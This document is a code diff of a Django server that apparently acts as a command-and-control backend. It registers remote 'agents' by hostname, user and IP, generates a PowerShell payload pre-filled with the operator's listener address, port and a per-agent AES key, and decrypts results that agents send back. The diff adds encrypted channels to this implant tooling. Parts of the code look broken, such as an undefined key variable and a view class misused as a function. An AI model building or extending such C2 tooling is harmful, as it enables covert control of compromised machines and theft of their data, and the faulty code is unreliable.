@@ -10,23 +10,23 @@ import random
 import string
 from django.http import HttpResponse , JsonResponse
 from django.views import View
-from flask import Flask
-import threading
-import sys
-from multiprocessing import Process
 from django.contrib.auth.models import User
 from django.http import HttpResponseRedirect 
 from .forms import UploadFileForm
 from rest_framework.response import Response
-from rest_framework import status
 from rest_framework.views import APIView
 from .serializers import *
 from datetime import datetime
+import base64
+import os
+import hashlib
+from Crypto import Random
+from Crypto.Cipher import AES
 
 current_path= os.path.dirname(os.path.abspath(__file__))
 
 listen_path = os.path.dirname(os.path.abspath(__file__))+"/data/listeners/"
-app         = Flask(__name__)
+# app         = Flask(__name__)
 port = 8000
 
 
@@ -46,6 +46,7 @@ def registerAgent(request):
         username = request.POST['username']
         remoteip = (get_client_ip(request))
         eth = request.POST['eth']
+        
         if Agent.objects.filter(hname = hostname).filter(username=username).exists():
             data = Agent.objects.filter(hname = hostname).filter(username = username).values()[0]
             agentname = data['name']
@@ -56,10 +57,12 @@ def registerAgent(request):
                 s.save()
         else:
             agentname     = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) #ASFASA
-            s=Agent(name=agentname, ip = remoteip, hname= hostname, username= username )
+            key = generateKey()
+            s=Agent(name=agentname, ip = remoteip, hname= hostname, username= username, key=key )
             s.save() 
-        
+
         Listener.agent(agentname,remoteip, eth)
+        Listener.payloadGen(key)
         request.session['agentName'] = agentname
         response = HttpResponse(agentname)
         response.set_cookie('agentName' , agentname)
@@ -67,7 +70,49 @@ def registerAgent(request):
     else:
         return ('',204)
 
+
+class AESCipher:
     
+    def __init__(self, key):
+        self.key = base64.b64decode(key)
+        self.bs  = AES.block_size
+        
+    def encrypt(self, raw): 
+        raw      = self.pad(raw)
+        iv       = Random.new().read(AES.block_size)
+        cipher   = AES.new(self.key, AES.MODE_CBC, iv)
+        return base64.b64encode(iv + cipher.encrypt(raw.encode("utf-8")))
+    
+    def decrypt(self,enc):
+        enc      = base64.b64decode(enc)
+        iv       = enc[:16]
+        cipher   = AES.new(self.key, AES.MODE_CBC, iv)
+        plain    = cipher.decrypt(enc[16:])
+        plain    = self.unpad(plain)
+        return plain 
+
+    def pad(self, s):
+        return s + (self.bs - len(s) % self.bs) * "\x00"
+
+    def unpad(self, s):
+        s = s.decode("utf-8")
+        return s.rstrip("\x00")
+
+def generateKey():
+    key    = base64.b64encode(os.urandom(32))
+    return key.decode()
+
+def ENCRYPT(PLAIN, KEY):
+    c   = AESCipher(KEY)
+    enc = c.encrypt(PLAIN)
+    return enc.decode()
+
+def DECRYPT(ENC, KEY):
+    c   = AESCipher(KEY)
+    dec = c.decrypt(ENC)
+    return dec
+
+
 class Listener():
     class PostListener(View):
         def post(self,request):    
@@ -98,16 +143,23 @@ class Listener():
             return render(request, 'blog/listeners.html' , {"listeners" : listeners})
 
     class payloadGen(View):
+
+        def __init__(self, key):
+            self.key= key
+
         def post(self,request):
             eth = request.POST['listener']      
             netifaces.ifaddresses(eth)
             ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
+
             output_path= "/tmp/{}".format(eth)
             with open(os.path.dirname(os.path.abspath(__file__))+"/powershell.ps1","rt") as p:
                 payload = p.read()
             payload = payload.replace('REPLACE_IP',ip)
             payload = payload.replace('REPLACE_PORT',str(port))
             payload = payload.replace('REPLACE_INTERFACE',eth)
+            payload = payload.replace('REPLACE_KEY',self.key)
+            
             with open(output_path,"wt") as R:
                 R.write(payload)
 
@@ -225,7 +277,10 @@ class Listener():
         def receiveResults(request,name=''):
                 resultspath = listen_path+"agents/{}/results".format(name)
                 if request.method == 'POST':
-                    result = request.POST['result']
+                    encresult = request.POST['result']
+                    agentdata = Agent.objects.filter(name=name).values()[0]
+                    key = agentdata['key']
+                    result= DECRYPT(encresult,key)
                     agent_Tasks = AgentTasks.objects.order_by("-created_date")[0]
                     agent_Tasks.task_result = result
                     agent_Tasks.save()
